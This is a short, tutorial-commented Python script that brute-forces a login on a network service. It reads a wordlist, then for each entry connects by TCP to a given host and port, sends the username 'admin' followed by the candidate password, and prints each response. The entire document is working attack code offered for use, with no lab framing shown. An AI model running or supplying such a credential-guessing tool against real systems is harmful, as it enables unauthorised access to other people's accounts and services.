#Imports the necessary libraries
import socket
import sys
from tqdm import tqdm # Provides a visual percentage of the script

print("IP PORT Wordlist") #After you run once the script it shows 
if len(sys.argv) == 4: # Ensures that all the arguments are given before proceeding
    with open(sys.argv[3],'r',encoding="latin-1") as file: #    # Opens the wordlist file with Latin-1 encoding to avoid UnicodeDecodeError
        stp_file=file.readlines()   #Reads the lines from the argument we have provide us a wordlist
    
    for item in tqdm(stp_file):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creates an IPV4 TCP socket
        s.connect((sys.argv[1],int(sys.argv[2]))) # Connect to the specified by the arguments HOST and PORT
        s.sendall("admin".encode("latin-1")) # First sends the admin for the connection to request the password
        print(s.recv(1024).decode("latin-1")) # Receives, decodes and prints the response. Specifying a buffer size to defines how much data is expected. 1024 is considered a standard.
        s.sendall(item.strip().encode("latin-1")) # Sends the words from the wordlist one by one, stripping newline characters and encoding them
        print(item) # Prints the word in use
        print(s.recv(1024).decode("latin-1"))
        s.close() # Closes the connection
